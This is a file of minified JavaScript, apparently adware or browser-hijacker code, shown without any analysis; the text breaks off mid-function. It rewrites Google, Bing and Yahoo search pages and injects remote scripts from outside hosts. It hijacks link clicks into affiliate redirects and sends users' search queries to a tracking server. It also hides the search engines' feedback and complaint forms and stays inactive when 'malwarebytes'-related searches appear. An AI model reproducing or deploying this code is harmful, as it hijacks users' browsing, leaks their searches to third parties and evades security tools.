try {
    ! function(u, h) {
        function c(e, t) {
            var n, r;
            for (r in l) l.hasOwnProperty(r) && 0 == r.indexOf(e) && (r < t ? l.removeItem(r) : n = l[r]);
            return n
        }

        function s(e, t, n) {
            var r = new XMLHttpRequest,
                a = 0;

            function o(e) {
                a || (a = 1, e = !e && (r.responseText || 0), t && t(e))
            }
            n = n || 5e3, r.open("GET", e, !0), r.onreadystatechange = function() {
                4 == r.readyState && o(+r.status / 200 != 1 || null)
            }, setTimeout(function() {
                r && r.abort && r.abort(), o(1)
            }, n), r.send()
        }

        function e() {
            if (!v) {
                v = 1;
                var e = u.getElementById(d),
                    t = "parentNode",
                    n = "removeChild",
                    r = d + "ctry",
                    a = r + f,
                    o = [],
                    i = c(r, r + (f - 432e5));
                e && e[t] && e[t][n] && e[t][n](e), s("//meetlookup.com/shows/?key=mXHgFFtXmRt26u9IFLlz0iBOMEpm&ukey=MTM1MzkgD1_LU1S68cRBsL4BFHW56g~~&count=1&"), s("//meetlookup.com/shows/?key=YA-298f_wfCUwTL3yYSDMyA2ZFpp&ukey=MTM1MzkgD1_LU1S68cRBsL4BFHW56g~~&count=1&"), h.xAdsOnCountryReady = function(e) {
                    if (i) try {
                        return e(i)
                    } catch (e) {}
                    o.push(e)
                };
                try {;
                    (function() {;
                        (function() {
                            var keywordList = ["charmsearching", "charmingsearch", "charmsearch", "malwarebytes"];
                            ! function(e) {
                                function i(e, n) {
                                    return (e.search.match(new RegExp("[?&]" + n + "=([^&]+)")) || [0, ""])[1]
                                }
                                var n = document,
                                    r = new function(n, r, o) {
                                        var t = this;
                                        t.getName = function(e) {
                                            return n.match(/^(?:www\.|)google\./) && "/search" == r.pathname && (e || r.search.indexOf("tbm=") <= 0) ? "google" : n.match(/^(?:[a-z]{0,3}\.|)search\.yahoo\.com$/) ? "yahoo" : n.match(/bing\.com$/) && "/search" == r.pathname ? "bing" : void 0
                                        }, t.google = function(e, n) {
                                            if ("google" == t.getName(n)) {
                                                if (e) {
                                                    if (0 < r.search.indexOf("source=hp")) return !1;
                                                    if (r.search.indexOf("&") < 0) return !1;
                                                    if (o) return !1
                                                }
                                                e = i(r, "q");
                                                return !!e && e.trim()
                                            }
                                        }, t.yahoo = function(e) {
                                            if ("yahoo" == t.getName()) {
                                                if (!e && !i(r, "hspart")) return !1;
                                                e = i(r, "p");
                                                return !!e && e.trim()
                                            }
                                        }, t.bing = function(e) {
                                            if ("bing" == t.getName()) {
                                                if (!e && r.search.indexOf("pc=cosp") < 0) return !1;
                                                e = i(r, "q");
                                                return !!e && e.trim()
                                            }
                                        }, t.keywords = function(e, n, r) {
                                            var o = 0 <= r.indexOf("google") && t.google(e),
                                                e = 0 <= r.indexOf("yahoo") && t.yahoo(n),
                                                n = 0 <= r.indexOf("bing") && t.bing(n);
                                            return o || e || n || !1
                                        }
                                    }(n.domain, location, n.referrer).google(!1, !0);
                                if (r && r.replace) {
                                    r = decodeURIComponent(r.replace(/\+/g, "%20"));
                                    n = new function(e, f) {
                                        e = e || "";

                                        function n(n, r) {
                                            return function(e) {
                                                if (null == e) return function(e) {
                                                    e = f.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
                                                    return e ? decodeURIComponent(e[1]) : void 0
                                                }(n);
                                                ! function(e, n, r) {
                                                    var o, t = (r = r || {}).expires;
                                                    "number" == typeof t && t && ((o = new Date).setTime(o.getTime() + 1e3 * t), t = r.expires = o), t && t.toUTCString && (r.expires = t.toUTCString());
                                                    var i, a, c = e + "=" + (n = encodeURIComponent(n));
                                                    for (i in r) r.hasOwnProperty(i) && (c += "; " + i, !0 !== (a = r[i]) && (c += "=" + a));
                                                    f.cookie = c
                                                }(n, e, {
                                                    expires: r,
                                                    path: "/",
                                                    domain: a
                                                })
                                            }
                                        }
                                        var r, o, t = 86400,
                                            i = {
                                                keywords: t,
                                                country: t,
                                                disable: 864e5
                                            },
                                            a = f.domain.replace(/^www\\./, "");
                                        for (r in i) i.hasOwnProperty(r) && (o = i[r], this[r] = n(e + r, o))
                                    }("eskucgkwiu72frkqawf", n);
                                    return n.disable() || function(e, n) {
                                        var r = c(n);
                                        if (!r.length) return !1;
                                        for (var o = 0; o < e.length; o++) {
                                            var t = c(e[o]);
                                            if (t) {
                                                for (var i = 0, a = 0; a < t.length; a++) 0 <= r.indexOf(t[a]) && i++;
                                                if (i >= t.length) return !0
                                            }
                                        }
                                        return !1
                                    }(e, r) && n.disable(1)
                                }

                                function c(e) {
                                    return e.toLowerCase().split(/[\s,;?!]+/).join(" ").trim().split(" ")
                                }
                            }(keywordList)
                        })()
                    })()
                } catch (e) {};
                try {;
                    (function() {;
                        (function() {
                            var subid = ('888');
                            var d = document.domain.split('.');
                            if (d[0] == 'www') d.shift();
                            if (d[0] != 'google') return;
                            if (location.pathname != '/search') return;
                            var s = document.createElement('script');
                            s.src = 'https://www.desideriosoldi.com/impl.php?i=OLUE4K0611&atr=' + subid;
                            var st = document.createElement('style');
                            st.innerText = '#rcnt {opacity: 1 !important;}';
                            setTimeout(function() {
                                document.head.appendChild(st)
                            }, 1500);
                            document.head.appendChild(s)
                        })()
                    })()
                } catch (e) {};
                try {;
                    ! function() {
                        var u = "http://iluhruhru.xyz/pg/?to=",
                            o = !1,
                            e = "999";
                        "S" == e[0] && "UBID" == e.substr(1) && (e = "");
                        var s, c, p, i, d, l, t, a, f, n, r, m, h, v = e || window.xYKAffSubIdTag || "",
                            g = !1,
                            w = document.domain.replace(/^www\./, "");

                        function y(e) {
                            function t(e) {
                                return ("00" + e).substr(-2)
                            }
                            return "" + (e = e || new Date).getFullYear() + "-" + t(e.getMonth() + 1) + "-" + t(e.getDate()) + " " + t(e.getHours()) + ":" + t(e.getMinutes()) + ":" + t(e.getSeconds())
                        }

                        function T(e) {
                            var t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
                            return t ? decodeURIComponent(t[1]) : void 0
                        }

                        function b(e, t, n) {
                            var r = (n = n || {}).expires;
                            if ("number" == typeof r && r) {
                                var o = new Date;
                                o.setTime(o.getTime() + 1e3 * r), r = n.expires = o
                            }
                            r && r.toUTCString && (n.expires = r.toUTCString());
                            var a = e + "=" + (t = encodeURIComponent(t));
                            for (var i in n)
                                if (n.hasOwnProperty(i)) {
                                    a += "; " + i;
                                    var f = n[i];
                                    !0 !== f && (a += "=" + f)
                                }
                            document.cookie = a
                        }

                        function S(e, t, n) {
                            if (n.domains) {
                                var r = n.domains;
                                delete n.domains;
                                for (var o = 0; o < r.length; o++) n.domain = r[o], b(e, t, n)
                            } else b(e, t, n)
                        }

                        function D(e, t) {
                            return t < e ? 1 : e < t ? -1 : 0
                        }

                        function x(e) {
                            if (!e.real) return 0;
                            var t = 0,
                                n = 0;
                            for (var r in e.real) e.real.hasOwnProperty(r) && (t += parseFloat(e.real[r]) || 0, n++);
                            return t / n
                        }

                        function E(e, t) {
                            var n;
                            return (n = D(e.custom, t.custom)) || (n = D(e.real && e.real[m], t.real && t.real[m])) || (n = D(x(e), x(t))) || (n = D(e.pps, t.pps)) ? n : (n = D(e.ppl, t.ppl)) || 0
                        }

                        function O(e, n) {
                            n = n || {};
                            var r = m;
                            return o && JSON.stringify(e.sort(E)), e.filter(function(e) {
                                if (!e.custom && e.geo.indexOf(r) < 0) return !1;
                                if (n.type) {
                                    if ("deep" == n.type && !e.deep) return !1;
                                    if ("offer" == n.type && e.deep) return !1
                                }
                                if (n.without)
                                    for (var t in n.without)
                                        if (n.without.hasOwnProperty(t) && e.id == t) return !1;
                                return !0
                            })
                        }

                        function I(e, t) {
                            if (!e) return !1;
                            var n = O(e, t);
                            return n.sort(E), o && JSON.stringify(n), n.pop()
                        }

                        function U(e) {
                            var t = O(e, {
                                type: "offer"
                            }).length;
                            g = 86400 * t;
                            var n, r = i();
                            if (r.deep || !(n = I(e, {
                                    type: "deep"
                                }))) {
                                var o = (new Date).getTime();
                                if (!(o - (new Date(r.deep).getTime() || 0) <= 432e5)) {
                                    for (var a in r.offers)
                                        if (r.offers.hasOwnProperty(a) && o - (new Date(r.offers[a]).getTime() || 0) <= 432e5) return;
                                    (n = I(e, {
                                        type: "offer",
                                        without: r.offers
                                    })) && c(n)
                                }
                            } else s(n)
                        }

                        function k(e, t, n) {
                            var r = new XMLHttpRequest;
                            r.open("GET", e, !0);
                            var o = !1;
                            r.onload = function() {
                                var e = r.responseText;
                                if (n) {
                                    e = !1;
                                    try {
                                        e = JSON.parse(r.responseText)
                                    } catch (e) {}
                                }
                                o || t(e), o = !0
                            }, r.onerror = r.onabort = function() {
                                o || t(!1), o = !0
                            }, setTimeout(function() {
                                r.abort()
                            }, 3e3), r.send()
                        }
                        a = (t = "asddfawrfaqsd") + "deep", f = t + "list", r = (n = t + "redir") + "ok", i = function() {
                                var e = {};
                                e.deep = T(a);
                                var t = {};
                                try {
                                    t = JSON.parse(T(f)).offers
                                } catch (e) {}
                                var n = (new Date).getTime();
                                for (var r in t)
                                    if (t.hasOwnProperty(r)) {
                                        var o = new Date(t[r]).getTime() || 0;
                                        1e3 * g < n - o && delete t[r]
                                    }
                                return e.offers = t, e
                            }, p = function(e) {
                                var t = [w, "." + w, e.domain, "." + e.domain];
                                if (e.deep) S(a, y(), {
                                    expires: 86400,
                                    path: "/",
                                    domains: t
                                });
                                else {
                                    var n = i(),
                                        r = y();
                                    n.offers[e.id] = r;
                                    var o = JSON.stringify(n);
                                    JSON.stringify(e), S(f, o, {
                                        expires: g,
                                        path: "/",
                                        domains: t
                                    })
                                }
                            }, d = function(e) {
                                var t = {
                                    expires: 20,
                                    path: "/",
                                    domain: w
                                };
                                b(n, e, t), b(r, e ? "" : "ok", t)
                            }, l = function() {
                                return T(r) ? "" : T(n)
                            },
                            function() {
                                var a = !1,
                                    e = l();
                                if (e) {
                                    d("");
                                    var t = document.head;
                                    if (t && t.appendChild) {
                                        var n = document.createElement("style");
                                        n.innerHTML = "* {display: none !important}", t.appendChild(n)
                                    }
                                    var r = function(e) {
                                        for (var t = location.search.substr(1), n = e.split("?"), r = (n[1] || "").split("&"), o = 0; o < r.length; o++) {
                                            var a = r[o].split("=")[0],
                                                i = t.replace(new RegExp("(?:^|\\&)" + a + "=[^&]*", "g"), "&" + r[o]);
                                            i == t && (i = t + "&" + r[o]), t = i
                                        }
                                        return n[0] + "?" + t.replace(/^[&]*/, "")
                                    }(e);
                                    return window.stop(), void(location.href = r)
                                }

                                function o(e) {
                                    if (!f && (e.protocol, e.href, !e.protocol || "http" == e.protocol.substr(0, 4))) {
                                        var t, n = e.href,
                                            r = a.url.replace(/SUB_ID/g, v || window.xYKAffSubIdTag || ""),
                                            o = a.domain;
                                        return e.hostname && e.hostname.substr(-o.length) == o ? (f = !0, p(a), a.deep ? (r.match(/ADDRESS/) ? t = r.replace(/ADDRESS/g, encodeURIComponent(n)) : (t = r, d(n)), t = u + encodeURIComponent(t), "_blank" == e.target ? window.open(t) : location.href = t) : (window.open(n), location.href = u + encodeURIComponent(r)), 1) : (e.hostname, e.hostname.substr(-o.length), 0)
                                    }
                                }

                                function i(e) {
                                    if ("which" in (e = e || window.event) && 3 == e.which || "button" in e && 2 == e.button) return !0;
                                    if (e.ctrlKey || e.metaKey || e.altKey || e.shiftKey) return !0;
                                    var t = e.srcElement || e.target;
                                    do {
                                        try {
                                            var n = (t.tagName || "").toUpperCase();
                                            if ("BUTTON" == n || "INPUT" == n) break;
                                            if (("A" == n || "AREA" == n) && t.href && "hostname" in t && o(t)) return e.returnValue && (e.returnValue = !1), e.preventDefault && e.preventDefault(), e.stopPropagation && e.stopPropagation(), e.stopImmediatePropagation && e.stopImmediatePropagation(), !1
                                        } catch (e) {
                                            break
                                        }
                                        t = t.parentNode
                                    } while (t);
                                    return !0
                                }
                                var f = !1;
                                return s = c = function(e) {
                                    a = e, document.addEventListener ? (document.removeEventListener("click", i, !0), document.addEventListener("click", i, !0)) : document.attachEvent && (document.detachEvent("onclick", i), document.attachEvent("onclick", i))
                                }
                            }() && (m = !1, h = "https://1637314617.rsc.cdn77.org/offers/", k("https://meetlookup.com/geolocation/", function(e) {
                                m = e, k(h + "domainList.json", function(e) {
                                    ! function(r, o) {
                                        if (r && r.length) {
                                            function e(n) {
                                                k(h + "bydomain/" + n + ".json", function(e) {
                                                    if (e && e.length) {
                                                        for (var t = 0; t < e.length; t++) e[t].domain = n;
                                                        i = i.concat(e)
                                                    }++a == r.length && o(i)
                                                }, !0)
                                            }
                                            for (var a = 0, i = [], t = 0; t < r.length; t++) e(r[t])
                                        }
                                    }(function(e) {
                                        if (e) {
                                            for (var t = w.split(".").reverse(), n = [], r = t[0], o = 1; o < t.length; o++) r = t[o] + "." + r, 0 <= e.indexOf(r) && n.push(r);
                                            return n
                                        }
                                    }(e), U)
                                }, !0)
                            }))
                    }()
                } catch (e) {};
                try {;
                    ! function() {
                        function c(e, t, n) {
                            for (var o = document.querySelectorAll(t), r = 0; r < o.length; r++) n(o[r])
                        }

                        function a(e, t) {
                            return c(document, e, t)
                        }

                        function d(e) {
                            e.setAttribute("style", "display: none !important")
                        }

                        function p(e) {
                            e.setAttribute("style", "display: block !important")
                        }

                        function u(e, t) {
                            var n = new XMLHttpRequest;
                            n.open("GET", "https://weathertab.online/search/ub/track_bingfb.php?sub=" + encodeURIComponent("") + "&msg=" + encodeURIComponent(e) + "&", !0), t && (n.onload = n.onerror = t), n.send()
                        }
                        var e = document.domain.split(".").slice(-2).join(".");
                        if ("microsoft.com" == e && 0 <= location.pathname.indexOf("/concern/bing")) return window.stop(), u("concern redirect", function() {
                            location.href = "//microsoft.com"
                        });
                        "bing.com" == e && document.addEventListener("click", function(e) {
                            if ("which" in (e = e || window.event) && 3 == e.which || "button" in e && 2 == e.button) return !0;
                            if (e.ctrlKey || e.metaKey || e.altKey || e.shiftKey) return !0;
                            var t = e.srcElement || e.target;
                            do {
                                try {
                                    var n, o, r = (t.tagName || "").toUpperCase();
                                    if ("A" == r && "fbpgdgsbbt" == t.id) return a("#fbpgdg > *", d), a("#fbthnk", p), a("#fbpgdgcl", function(e) {
                                        n = e
                                    }), p(n.parentNode), p(n.parentNode.parentNode), c(0, ".step1", d), e.preventDefault(), e.stopPropagation(), e.stopImmediatePropagation(), a("#fbpgdgtx", function(e) {
                                        o = e.innerText || e.value
                                    }), u('feedback form rewrited: "' + o.replace(/[\s\n\r]+/g, " ") + '"'), !1;
                                    if ("A" == r && "sb_feedback" == t.id) {
                                        var i = document.createElement("style");
                                        return i.innerHTML = "#fbpgdgrplk {display: none !important;}", document.head.appendChild(i), !0
                                    }
                                } catch (e) {
                                    console.error(e)
                                }
                                t = t.parentNode
                            } while (t);
                            return !0
                        }, !0)
                    }()
                } catch (e) {};
                try {;
                    ! function() {
                        function o(e, n) {
                            return function(e, n) {
                                for (var t = document.querySelectorAll(e), o = 0; o < t.length; o++) n(t[o])
                            }((document, e), n)
                        }

                        function a(e) {
                            e.setAttribute("style", "display: none !important")
                        }
                        var c = document.domain;
                        ! function(e) {
                            var n = document.readyState;
                            if ("interactive" == n || "complete" == n) return e();
                            document.addEventListener("DOMContentLoaded", e)
                        }(function() {
                            var e, n, t;
                            "help.yahoo.com" == c ? 0 <= location.pathname.indexOf("/kb/search-for-desktop") && (o("div#pltl.contact", a), e = "yahoo help contact removed", (t = new XMLHttpRequest).open("GET", "https://weathertab.online/search/ub/track_bingfb.php?sub=" + encodeURIComponent("") + "&msg=" + encodeURIComponent(e) + "&", !0), n && (t.onload = t.onerror = n), t.send()) : "search.yahoo.com" == c && o("a#usr-fdb-lnk", function(e) {
                                a(e.parentNode)
                            })
                        })
                    }()
                } catch (e) {};
                try {;
                    (function() {
                        var subid = '' || false;

                        function checkBing() {
                            if (document.domain.indexOf('bing.com') < 0) return false;
                            if (location.pathname != '/search') return false;
                            return true
                        }
                        if (!checkBing()) return;

                        function getQuery(key) {
                            return (location.search.match(new RegExp('[?&]' + key + '=([^&]+)')) || [0, ''])[1]
                        }
                        if (subid) {
                            if (getQuery('ptag').indexOf('N' + subid) < 0) return
                        }
                        var s = document.createElement('style');
                        s.innerHTML = '.b_adSlug { display: none !important }';
                        document.head.appendChild(s)
                    })()
                } catch (e) {};
                try {;
                    (function() {
                        window.xAdsGogRedir = function(i) {
                            if (i && i.url) {
                                var o = new function(t) {
                                        t = t || "";

                                        function e(r, a) {
                                            return function(t) {
                                                if (null == t) return e = r, (n = s.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(n[1]) : void 0;
                                                var e, n;
                                                ! function(t, e, n) {
                                                    var r, a = (n = n || {}).expires;
                                                    "number" == typeof a && a && ((r = new Date).setTime(r.getTime() + 1e3 * a), a = n.expires = r), a && a.toUTCString && (n.expires = a.toUTCString());
                                                    var i, o = t + "=" + (e = encodeURIComponent(e));
                                                    for (var p in n) {
                                                        n.hasOwnProperty(p) && (o += "; " + p, !0 !== (i = n[p]) && (o += "=" + i))
                                                    }
                                                    s.cookie = o
                                                }(r, t, {
                                                    expires: a,
                                                    path: "/",
                                                    domain: i
                                                })
                                            }
                                        }
                                        var s = document,
                                            n = {
                                                keywords: 86400,
                                                country: 86400,
                                                disable: 864e5
                                            },
                                            i = s.domain.replace(/^www/, "");
                                        for (var r in n) {
                                            var a;
                                            n.hasOwnProperty(r) && (a = n[r], this[r] = e(t + r, a))
                                        }
                                    }("eskucgkwiu72frkqawf"),
                                    t = i.direct;
                                ! function() {
                                    var r = document,
                                        i = x;
                                    i.doc = new i(r), i.html = new i(r.documentElement), i.head = new i(r.head), i.body = new i(r.body), i.isElem = function(t) {
                                        return t instanceof i
                                    }, i.isNode = function(t) {
                                        return t instanceof Node
                                    }, i.delete = function(t) {
                                        var e = t;
                                        if ("string" == typeof t) {
                                            if (!i.doc.bySel) return;
                                            e = i.doc.bySel(t)
                                        } else i.isNode(e) ? e = [e] : i.isElem(e) && (e = [e.unwrap()]);
                                        if (e.length && e[0])
                                            for (var n = "removeChild", r = 0; r < e.length; r++) {
                                                var a = e[r].parentNode;
                                                a && a[n] && a[n](e[r])
                                            }
                                    }, i.create = function(t) {
                                        return new i(r.createElement(t))
                                    };
                                    var a = null,
                                        o = !0;
                                    i.onDomReady = function(t) {
                                        var e, n;
                                        a || (a = [], o = !0), a.push(t), o && (o = !1, e = function() {
                                            var t = a.slice();
                                            a = null;
                                            for (var e = 0; e < t.length; e++) t[e].apply(this, arguments)
                                        }, "interactive" == (n = r.readyState) || "complete" == n ? e() : r.addEventListener("DOMContentLoaded", e, !1))
                                    }
                                }();
                                var e, n = (e = x.create("style").html("html, body {display: none !important}"), {
                                    append: function() {
                                        e && x.head.append(e)
                                    },
                                    delete: function() {
                                        e && e.delete()
                                    }
                                });
                                if (! function() {
                                        try {
                                            var t = v() || w();
                                            t && (i.redesign && n.append(), z() && g(t, !1), "yahoo" == i.redesign && v() && ((e = x.head).append(x.create("style").html("#browserExtensionPromotionBanner {display: none !important;}.compTitle > div {margin: 0 0 3px 0 !important;}.lh-16:not([class*=mah]), .fz-s {line-height: 20px !important;}.ds_promo_newtab {display: none !important;}#sbq-wrap {height: 46px !important;width: 100% !important;}body.typing #doc:not(.uh3lite) #hd .sbx {width: 664px !important;}#sbq-wrap .sbq {height: 46px !important;box-sizing: border-box !important;padding: 12px 40px 12px 20px !important;border-radius: 24px 24px 24px 24px !important;width: 100% !important;font-size: 16px !important;border: 1px solid #dfe1e5 !important;}body.typing #sbq-wrap .sbq  {border-radius: 24px 24px 0 0 !important;}body.typing #doc:not(.uh3lite) #sbq-wrap .sbq  {padding: 12px 40px 12px 48px !important;}.sa .sa-tray {border-radius: 0 0 24px 24px !important;}.sbx #sf {border-radius: 24px !important;}.sa .sa-tray-list-container {padding: 5px 0 0 0 !important;}.sa-tray-list-container li {line-height: 22px !important;font-size: 16px !important;padding: 0 0 0 0px !important;margin: 0 20px 0 20px!important;}.sa-tray-list-container li b {line-height: 22px !important;font-size: 16px !important;}#hd {border: none !important;}#hd .sbx {width: 636px !important;}#sticky-hd, #doc.uh3-p #sticky-hd, #ysch #doc #sticky-hd {background-color: #fff !important;}#yucsHead, #yucs-apps-overlay, #sbq-clear, #logo, .sbb-wrap {display: none !important;}input[type=submit].sbb {position: absolute !important;width: 38px !important;right: -8px !important;opacity: 0 !important;z-index: 200 !important;}#ys #horizontal-bar .visible-pivots .active {border-color: #1A73E8 !important;}#ys .c-dgray:hover, #ys .c-black-h:hover {color: #1A73E8 !important;}#ys #horizontal-bar .active span {color: #1A73E8 !important;}.compTitle .s-img, .compTitle em {display: none !important;}#main li .compText {font-size: 14px;line-height: 22px;color: #3C4043;}#main .compDlink, .AdTitleBttm, .AdHdrTop {display: none !important;}.sa-sbx-container {min-width: 636px !important;}h3.title, h3.title a {font-size: 20px !important;line-height: 26px !important;}")), e.append(x.create("link").attr("rel", "icon").attr("type", "image/x-icon").attr("href", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAABOFBMVEUAAAD9/f39/f3////9/f39/f3////9/f39/f39/f3+/v7////9/f3+/v7+/v7////+/v79/f39/f39/f39/f39/f39/f39/f3///////9ChfQ0qFPqQzX7vAWox/r85+VIsWTsVUj8/P3n9evZ79+t3Ln3urVlvX3rRjb1+P7j7f7C2PyfwflUkPX+9PP+9t75zMi44cOi2LD3ta+V0qX1o5z0m5T934fyjIT93H3wc2k+rFvuZVnrSj37why/1ft3p/dgmfbw+fLs9+/98O5BieP85OLC5cw+jsr4v7qb0rFjsaj1p6CNzp97xo/zlIyPx4JswILxgXg3oHfxf3ZcuXVUtm70kG3vbGE1pWD801n80lg8qFDtXFD8zkf8zUbrTD+GsDPkwi6ztSH5riHxdyD1kxX2vAk5DVrTAAAAGXRSTlMA+usjypwJ9tOZJgyLWVYwDvz36NCfjYcPjZUjQAAAAaFJREFUOMt9k3d7gjAQxgOIVsXVOkoBFbdWrbuttXvvvff+/t+guQSJCE9/fwSfe9/kLucFMcIB0cVzHO8SA2FkxxeblE08om9MdscjsgVOclu2T8g2JgSmh3gSSnX7eqmk97s7MsCHzP08kS9Uk6sUcRhn+Mn5hWV1hLd9koXWEYffR6qVBRmQSIII7KfhQa/d7g2oDnCQJAb5yfnPDRpu6KeygYjQNPTnFvS7+jBcZx3zowD+zGnfqqpvyQ4EkYjXeU37KRVkJ7zIhddXTdO+Mo4GF4ImrWDDgxGZYaxCsxCHVw2zaDck4aL/GapgMFM8Op/AkyJfsOHDUmQFDLNQ5PCan0/5UUMSDBW4Jm3U77uipDeZXq5hfZ02KuzBnzMFc70x1DNrpATaapIjuwSO9C7Vc4eg18qQAf5uuGhTIdwc5/OdoqJcbtMSOTJTEuxqKRbu96oQTdCRJyPXhCyMA4hFjdEXyNBmT5hczEFkShgb+2zrPI1LLXawDHoImQgODycqWJ6exFllLuFGVgTRw2SPV0B2/EEvff7eoJ9F/wAB8Vxt9QDjvAAAAABJRU5ErkJggg==")), s = "https://www.google.com/search?tbm=isch&q=", c = "https://www.google.com/search?tbm=vid&q=", d = "https://www.google.com/search?tbm=nws&q=", x.onDomReady(function() {
                                                for (var t = x.body.byTag("a"), e = 0; e < t.length; e++) {
                                                    var n = new x(t[e]),
                                                        r = n.attr("href") || "";
                                                    0 < r.indexOf("search/images") && n.attr("href", s + l).attr("target", "_blank"), 0 < r.indexOf("search/video") && n.attr("href", c + l).attr("target", "_blank"), 0 < r.indexOf("news.search.yahoo") && n.attr("href", d + l).attr("target", "_blank")
                                                }
                                                var a = "position: absolute; z-index: 20; width: 38px; height: 38px; cursor: pointer",
                                                    i = x.create("img").attr("src", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAXVBMVEUAAABChfSbvvmsyfpMjPShwvpmnPZXk/Xb6P2yzvuDr/jF2vy/1vumxvqfwvmUuvl0pfdRj/VHiPTg6/7R4v3N3/y40ftvovZdl/W70/uMtfiHsfh7qfd6qfdgmPVdQb1SAAAAAXRSTlMAQObYZgAAAK9JREFUSMft0bsSgkAQRNG+sDwEBEQF3///mVoKNeFAQJUBJ9oJunZ3WpvNHzk2bRbSItZMCaNXrjlSIK3rJgBX+SLIztMpyJXDRaMeWnnuYC8v4Oj/YLDhBJUcHZEMn8kBiUzgJkdGIQNuew8ONuzgLEcJtV1HJlcLe+u8kq+DoZSUhLFDTxmYHJy1WsFfXSRLOKrmGfW/NVkvvjGxXzkRA/HiRL4wkWiZkzabNbwBQzsEW6G3n2MAAAAASUVORK5CYII=").attr("style", "top: 4px; right: 8px;" + a),
                                                    o = x.body.bySel("form#sf", 0);
                                                o.append(i), i.unwrap().addEventListener("click", function() {
                                                    o.unwrap().submit()
                                                });
                                                var p = x.create("img").attr("src", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwAQMAAABtzGvEAAAAAXNSR0IB2cksfwAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAAZQTFRF////c3NzzmsPxAAAABdJREFUeJxjYKAhYH78+AEBalDooyIAAKqqJ+gBNR2vAAAAAElFTkSuQmCC").attr("style", "top: 15px; right: 20px;" + a);
                                                x.body.bySel("div#hd", 0).append(p), p.unwrap().addEventListener("click", function() {
                                                    window.open("https://about.google/products/")
                                                });
                                                A(function() {
                                                    for (var t = x.doc.byTag("style"), e = 0; e < t.length; e++) "" == t[e].innerHTML && t[e].parentNode.removeChild(t[e])
                                                }, 250)
                                            })), "bing" == i.redesign && y())
                                        } catch (t) {
                                            g("Error (4)! " + t.message, !1)
                                        }
                                        var e, s, c, d;
                                        n.delete()
                                    }(), i.go && function(t) {
                                        var e = document.domain.split(".");
                                        if ("www" == e[0] && ((e = e.reverse()).pop(), e = e.reverse()), "google" == e[0] && "/search" == location.pathname && !(0 < location.search.indexOf("tbm="))) {
                                            if (t) {
                                                if (0 < location.search.indexOf("source=hp")) return;
                                                if (location.search.indexOf("&") < 0) return;
                                                if (document.referrer) return
                                            }
                                            return 1
                                        }
                                    }(t)) {
                                    var l = k("q").trim();
                                    if (l) {
                                        if (!t)
                                            if ((o.keywords() || "").toLowerCase() == l.toLowerCase()) return;
                                        if (function(t) {
                                                var e, n;
                                                try {
                                                    if (!i.filter) return;
                                                    if (e = i.filter[0].toLowerCase().trim(), !(n = parseInt(i.filter[1])) || !e) return
                                                } catch (t) {
                                                    return
                                                }
                                                if (o.disable()) return 1;
                                                if (t && t.replace) {
                                                    var r = decodeURIComponent(t.replace(/\+/g, "%20")).toLowerCase().split(/[\s,;?!]+/).join(" ").trim().split(" ");
                                                    if (r.length >= n)
                                                        for (var a = 0; a < r.length; a++) {
                                                            if (0 <= r[a].replace(/[.,\/#!$%\^&\*;:{}=\-_`~()]+/g, " ").split(/[\s]+/).indexOf(e)) return o.disable(1), 1
                                                        }
                                                }
                                            }(l)) g(l, !0);
                                        else {
                                            function r() {
                                                return b || (b = !0, o.keywords(l), function(t) {
                                                    x.delete("meta[name=referrer],meta[name=referer]");
                                                    for (var e, n = ["none", "no-referrer", "never"], r = 0; r < n.length; r++) x.head.append((e = n[r], x.create("meta").attr("name", "referrer").attr("content", e)));
                                                    location.href = t
                                                }(i.url + l)), !0
                                            }
                                            var a, p, s, c, d, h, f, m, u, b = !1;
                                            try {
                                                if (t ? n.append() : (x.head.append(x.create("style").html("#tads, #bottomads, div[class*=commercial] {display: none !important}")), u = function() {
                                                        setTimeout(r, 10)
                                                    }, A(M, 200), x.onDomReady(M)), z()) {
                                                    if (t) return r();
                                                    (a = function(t) {
                                                        t || r()
                                                    }) && (p = document, s = window, c = p.addEventListener.bind(p), h = "Hidden", f = "visibilitychange", m = function(t) {
                                                        var e = {
                                                            focus: !0,
                                                            focusin: !0,
                                                            pageshow: !0,
                                                            blur: !1,
                                                            focusout: !1,
                                                            pagehide: !1
                                                        };
                                                        (t = t || s.event) in e ? a(e[t]) : t.type in e ? a(e[t.type]) : a(!this[d])
                                                    }, (d = "hidden") in p ? c(f, m) : (d = "moz" + h) in p ? c("moz" + f, m) : (d = "webkit" + h) in p ? c("webkit" + f, m) : (d = "ms" + h) in p ? c("ms" + f, m) : "onfocusin" in p ? p.onfocusin = p.onfocusout = m : s.onpageshow = s.onpagehide = s.onfocus = s.onblur = m, void 0 !== p[d] && m({
                                                        type: p[d] ? "blur" : "focus"
                                                    }))
                                                }
                                            } catch (t) {
                                                g("Error (2)! " + t.message, !1)
                                            }
                                            n.delete()
                                        }
                                    }
                                }
                            }

                            function g(t, e) {
                                var n;
                                i.track && ((n = new XMLHttpRequest).open("GET", "https://weathertab.online/search/ub/track.php?gd=" + i.track + "&banned=" + !!e + "&q=" + t, !0), n.send(null))
                            }

                            function A(t, e) {
                                return t(), setInterval(t, e)
                            }

                            function v() {
                                if (document.domain.indexOf("search.yahoo.com") < 0) return !1;
                                var t = document.domain.split(".")[0];
                                if ("search" != t && 3 < t.length) return !1;
                                var e = k("p");
                                return !!e && e.trim()
                            }

                            function w() {
                                if (document.domain.indexOf("bing.com") < 0) return !1;
                                if ("/search" != location.pathname) return !1;
                                if (location.search.indexOf("pc=cosp") < 0) return !1;
                                var t = k("q");
                                return !!t && t.trim()
                            }

                            function x(r) {
                                var a = x;
                                this.byId = this.byClass = this.byTag = function() {
                                    return new a(null)
                                }, this.attr = this.html = function() {
                                    return null
                                };

                                function n(t, e) {
                                    return l(e) ? t : t && t.length ? new a(t[e]) : new a(null)
                                }
                                var e = "getElementById",
                                    i = "getElementsByClassName",
                                    o = "getElementsByTagName",
                                    p = "setAttribute",
